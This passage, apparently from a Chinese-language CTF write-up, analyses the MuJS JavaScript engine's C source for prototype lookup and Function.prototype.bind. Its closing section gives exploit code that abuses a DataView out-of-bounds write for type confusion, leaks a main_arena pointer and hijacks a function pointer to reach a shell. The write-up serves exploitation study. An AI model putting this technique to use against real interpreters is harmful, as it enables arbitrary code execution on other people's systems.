</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>查看这个函数， 其实就是顺着<code>prototype</code>这个单项链表查找， 这个其实就是原型链。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>js_Property <span class="token operator">*</span><span class="token function">jsV_getproperty</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> js_Object <span class="token operator">*</span>obj<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">do</span> <span class="token punctuation">{</span>
		js_Property <span class="token operator">*</span>ref <span class="token operator">=</span> <span class="token function">lookup</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>properties<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>ref<span class="token punctuation">)</span>
			<span class="token keyword">return</span> ref<span class="token punctuation">;</span>
		obj <span class="token operator">=</span> obj<span class="token operator">-&gt;</span>prototype<span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>我们的<code>setUint8</code>也就是在这里找到的，那么在那里定义的呢？</p> <p>在<code>jsB_initdataview</code>初始化函数中， 调用 <code>jsB_propf</code>进行设置。</p> <p>而这个<code>obj-&gt;properties</code>是在创建这个对象的过程中进行定义的。在<code>jsB_new_DataView</code>创建对象使用<code>jsV_newobject</code>函数，这个函数第三个参数就是原型</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>js_Object <span class="token operator">*</span><span class="token function">jsV_newobject</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> <span class="token keyword">enum</span> <span class="token class-name">js_Class</span> type<span class="token punctuation">,</span> js_Object <span class="token operator">*</span>prototype<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	js_Object <span class="token operator">*</span>obj <span class="token operator">=</span> <span class="token function">js_malloc</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> <span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> <span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>gcmark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>gcnext <span class="token operator">=</span> J<span class="token operator">-&gt;</span>gcobj<span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>gcobj <span class="token operator">=</span> obj<span class="token punctuation">;</span>
	<span class="token operator">++</span>J<span class="token operator">-&gt;</span>gccounter<span class="token punctuation">;</span>

	obj<span class="token operator">-&gt;</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>properties <span class="token operator">=</span> <span class="token operator">&amp;</span>sentinel<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>prototype <span class="token operator">=</span> prototype<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>extensible <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>于是这个调用关系也理清了，</p> <p>那么问题来了，我们目前只是修改了<code>obj-&gt;type</code>位置。这个可以获取方法的原型仍然指向<code>DataView</code>， 所以没办法直接调用<code>setTime</code>函数，</p> <p>在测试中我们发现， 其实可以直接使用<code>Date.prototype.setTime</code>调用对应的函数，但是这时在函数内的<code>self</code>是指向的默认<code>Date</code>实例。</p> <p>这时候搜了下相关的东西，没发现杀，翻找了下程序其他位置看看是否还有什么离谱的方法可以配合使用。找到了这么一个位置。</p> <p>对于function类型对象，定义了几个可用的方法，在js代码中定义的函数和预先设置好的c层的内置函数都有对应的fcuntion结构体，都可以使用这几个方法。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>
<span class="token keyword">void</span> <span class="token function">jsB_initfunction</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	J<span class="token operator">-&gt;</span>Function_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;Function.prototype&quot;</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Function_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>function <span class="token operator">=</span> jsB_Function_prototype<span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Function_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	J<span class="token operator">-&gt;</span>Function_prototype<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Function_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">{</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Function.prototype.toString&quot;</span><span class="token punctuation">,</span> Fp_toString<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Function.prototype.apply&quot;</span><span class="token punctuation">,</span> Fp_apply<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Function.prototype.call&quot;</span><span class="token punctuation">,</span> Fp_call<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">jsB_propf</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Function.prototype.bind&quot;</span><span class="token punctuation">,</span> Fp_bind<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">js_newcconstructor</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> jsB_Function<span class="token punctuation">,</span> jsB_Function<span class="token punctuation">,</span> <span class="token string">&quot;Function&quot;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defglobal</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;Function&quot;</span><span class="token punctuation">,</span> JS_DONTENUM<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>这里面值得注意的是<code>Fp_bind</code>函数， 稍微有点复杂， 总的来说前面一点检测，然后是使用<code>js_newcconstructor</code>设置了一个<code>JS_CCFUNCTION</code>类型对象，后续就是使用<code>js_defproperty</code>为这个对象设置了三个<code>property</code>， <code>__TargetFunction__</code>, <code>__BoundThis__</code>, <code>__BoundArguments__</code>，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Fp_bind</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">int</span> i<span class="token punctuation">,</span> top <span class="token operator">=</span> <span class="token function">js_gettop</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> n<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">js_iscallable</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token function">js_typeerror</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token string">&quot;not a function&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	n <span class="token operator">=</span> <span class="token function">js_getlength</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&gt;</span> top <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>
		n <span class="token operator">-=</span> top <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token comment">/* Reuse target function's prototype for HasInstance check. */</span>
	<span class="token function">js_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&quot;prototype&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_newcconstructor</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> callbound<span class="token punctuation">,</span> constructbound<span class="token punctuation">,</span> <span class="token string">&quot;[bind]&quot;</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* target function */</span>
	<span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;__TargetFunction__&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* bound this */</span>
	<span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;__BoundThis__&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* bound arguments */</span>
	<span class="token function">js_newarray</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> top<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_setindex</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;__BoundArguments__&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><p>这个新的<code>JS_CCFUNCTION</code>对象，</p> <ul><li><p>有一个对这个函数的构造函数为<code>constructbound</code>， 在想要创建这个函数时会调用他(比如制定这个bind的函数结果为一个值的话，会进入<code>OP_NEW</code>在这个调用链上会使用这个<code>obj-&gt;u.c.constructor</code>)，</p></li> <li><p>有一个对应的c语言函数， 在被调用的时候跳转过去，<code>OP_CALL</code>的时候调用<code>js_call</code>， 会调用 <code>obj-&gt;u.c.function</code>函数， 在这里定义是<code>callbound</code>函数，</p></li></ul> <p>如下是<code>js_newccountstructor</code>函数。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">/* prototype -- constructor */</span>
<span class="token keyword">void</span> <span class="token function">js_newcconstructor</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">,</span> js_CFunction cfun<span class="token punctuation">,</span> js_CFunction ccon<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	js_Object <span class="token operator">*</span>obj <span class="token operator">=</span> <span class="token function">jsV_newobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> JS_CCFUNCTION<span class="token punctuation">,</span> J<span class="token operator">-&gt;</span>Function_prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>function <span class="token operator">=</span> cfun<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>constructor <span class="token operator">=</span> ccon<span class="token punctuation">;</span>
	obj<span class="token operator">-&gt;</span>u<span class="token punctuation">.</span>c<span class="token punctuation">.</span>length <span class="token operator">=</span> length<span class="token punctuation">;</span>
	<span class="token function">js_pushobject</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* proto obj */</span>
	<span class="token punctuation">{</span>
		<span class="token function">js_pushnumber</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;length&quot;</span><span class="token punctuation">,</span> JS_READONLY <span class="token operator">|</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_rot2</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* obj proto */</span>
		<span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* obj proto obj */</span>
		<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;constructor&quot;</span><span class="token punctuation">,</span> JS_DONTENUM<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">js_defproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&quot;prototype&quot;</span><span class="token punctuation">,</span> JS_DONTENUM <span class="token operator">|</span> JS_DONTCONF<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>因为我们只是一次函数调用， 所以只关注<code>callbound</code>函数即可。</p> <p>可以看到会对前面提到的三个 <code>property</code>进行解析，然后依次压栈， 这个顺序其实和我们本身调用原型方法函数的顺序是一致的，首先是函数，然后是调用实例(或者在js中应该是this指针， 在c层实现中写的是self)， 然后接下来是参数，最后使用<code>js_call</code>进行调用。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">callbound</span><span class="token punctuation">(</span>js_State <span class="token operator">*</span>J<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> top <span class="token operator">=</span> <span class="token function">js_gettop</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">,</span> fun<span class="token punctuation">,</span> args<span class="token punctuation">,</span> n<span class="token punctuation">;</span>

  fun <span class="token operator">=</span> <span class="token function">js_gettop</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">js_currentfunction</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">js_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> fun<span class="token punctuation">,</span> <span class="token string">&quot;__TargetFunction__&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">js_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> fun<span class="token punctuation">,</span> <span class="token string">&quot;__BoundThis__&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  args <span class="token operator">=</span> <span class="token function">js_gettop</span><span class="token punctuation">(</span>J<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">js_getproperty</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> fun<span class="token punctuation">,</span> <span class="token string">&quot;__BoundArguments__&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  n <span class="token operator">=</span> <span class="token function">js_getlength</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token function">js_getindex</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> args<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">js_remove</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> top<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token function">js_copy</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">js_call</span><span class="token punctuation">(</span>J<span class="token punctuation">,</span> n <span class="token operator">+</span> top <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>这一套操作也可以在<code>opcode</code>层面做对照，是这样的</p> <p>前半部分，相当于是用<code>setTime</code>这个实例来调用<code>bind</code>方法，参数是b (也就是我们exp.js中被修改的那个实例)， 可以看到去到了<code>Function.prototype.bind</code> 函数运行， 后面再次传入参数以后进行调用， 其实就是调用的<code>setTime.bind(b)</code>这个整体作为的一个函数，</p> <p>可以看到先进入了<code>[bind]</code>名字的函数，也就是我们上面看到的<code>js_newccountructor</code>函数创建的那个函数，然后再转入到<code>Date.prototype.setTime</code> 函数。</p> <p><img src="https://s2.loli.net/2022/03/03/WDLtoMAuCVOPial.png" alt="image-20220303213206503"></p> <p>于是我们得到了一个可以不通过原型链去调用方法函数的方案，</p> <p><code>Data.prototype.setTime.bind(b)(0x30) = b.setTime(0x30)</code>， 如果b原型链有setTime的话那么两者是一样的，如果没有可以通过前者去调用。</p> <p>后者的调用逻辑是, 压栈对象实例， 通过调用链找到<code>setTime</code>函数，然后互换栈顶的函数和实例，然后压栈参数，形成从栈顶往下为: <code>参数 | 实例 | 函数</code>，  然后<code>OP_CALL</code>opcode或者说调用了<code>js_call</code>函数，</p> <p>前者相当于封装了一个新函数<code>[bind]</code>， 完成 <code>参数 | 实例 | 函数</code>的内存布局， 然后调用<code>js_call</code>函数，</p> <p>两者的效果一致。</p> <h3 id="getshell"><a href="#getshell" class="header-anchor">#</a> getshell</h3> <p>然后利用思路基本就完整了，上一步将<code>obj-&gt;u.dataview.length</code> 修改以后，基本可以实现内存在一个较大范围内的任意读写，</p> <p>然后在后面再次申请一个obj结构体(其实这个是啥都ok)， 然后将其修改为<code>JS_CCFUNCTION</code>类型对象，设置好<code>obj-&gt;u.c.function</code>，然后进行调用，可以在c层实现代码执行。</p> <p>可能还要泄漏数据，通过堆 main_arean进行泄漏。</p> <h2 id="exp"><a href="#exp" class="header-anchor">#</a> exp</h2> <p>首先是申请内存，重复覆盖一个变量，这样达到<code>a.data | b | b.data</code>的效果，</p> <p>然后可以使用<code>a</code>的越界修改<code>b-&gt;type</code>为<code>JS_DATE</code>， 并通过<code>setTime</code>函数修改<code>b-&gt;number</code>位置，这里低位同时是<code>b-&gt;u.dataview.length</code>， 将<code>b</code>修改回<code>JS_DATAVIEW</code>， 这时候<code>b</code>可读写的内存巨大，可以直接往后获取main_arean, 然后往后修改下一个object， 改成一个<code>JS_CCFUNCTION</code>类型， 设置好对应function,  然后main_arean计算偏移到libc_base， 再到onegadget,</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
a <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c <span class="token operator">=</span> <span class="token function">DataView</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// heap : c-c.data-d</span>

a<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// b is a Date type</span>
<span class="token class-name">Date</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">setTime</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1e12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// b.u.dataview.length = (int)(double)(time);</span>
a<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0x68</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// b is a DataView</span>

main_arean_low <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
main_arean_high <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0x4f4</span> <span class="token operator">+</span> <span class="token number">0x51</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

main_arean_low <span class="token operator">=</span> main_arean_low <span class="token comment">// - main_arean_relative_address + onegadget_relative_address</span>

b<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c-&gt;type = JS_CCFUNCTION</span>
b<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c-&gt;u.c.name = 0</span>
b<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span> main_arean_low<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c-&gt;u.c.function </span>
b<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0xe8</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> main_arean_high<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c_&gt;u.c.function</span>

